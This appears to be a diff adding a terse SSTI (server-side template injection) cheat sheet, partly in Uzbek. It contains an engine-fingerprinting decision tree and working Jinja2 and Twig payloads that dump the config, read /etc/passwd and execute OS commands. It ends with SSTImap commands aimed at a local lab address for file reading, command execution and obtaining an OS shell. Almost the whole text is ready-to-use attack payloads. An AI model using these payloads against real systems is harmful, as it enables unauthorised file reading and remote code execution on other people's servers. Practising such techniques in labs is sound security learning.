@@ -1,0 +1,76 @@
+SSTI identity
+
+${{<%[%'"}}%\.
+
+
+${7*7}
+├── Yashil ➔ a{*comment*}b
+│    ├── Yashil ➔ Smarty
+│    └── Qizil  ➔ ${"z".join("ab")}
+│         ├── Yashil ➔ Mako
+│         └── Qizil  ➔ Unknown
+│
+└── Qizil  ➔ {{7*7}}
+     ├── Qizil  ➔ Not vulnerable
+     └── Yashil ➔ {{7*'7'}}
+          ├── Yuqori o'q ➔ Jinja2
+          ├── O'rta o'q  ➔ Twig
+          └── Pastki o'q ➔ Unknown
+          
+          
+                  exlploiting	SSTI - Jinja2
+                  
+                  config fayl
+                  {{ config.items() }}
+                  
+                  source code
+                  {{ self.__init__.__globals__.__builtins__ }}
+                  
+                  
+                  
+                  
+                  LFI (local file inclusion)
+                  {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
+                  
+                  
+                  RCE (remote code execution)
+                  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+                  
+                  
+                  
+                  SSTI - Twig
+                  
+                  config
+                  {{ _self }}
+                  
+                  LFI
+                  {{ "/etc/passwd"|file_excerpt(1,-1) }}
+                  
+                  
+                  RCE
+                  {{ ['id'] | filter('system') }}
+                  
+                  
+                  
+                  ssti map download and setup
+                  
+                  git clone https://github.com/vladko312/SSTImap
+		  cd SSTImap
+		  pip3 install -r requirements.txt                   
+		  python3 sstimap.py
+		  
+		  
+		  faylni oqish uchun
+		  python3 sstimap.py -u http://172.17.0.2/index.php?name=test 
+		  -D '/etc/passwd' './passwd'
+		  
+		  
+		  
+		  command execution
+		  python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
+		  
+		  
+		  obtain shell
+		  python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
+		  
+		  
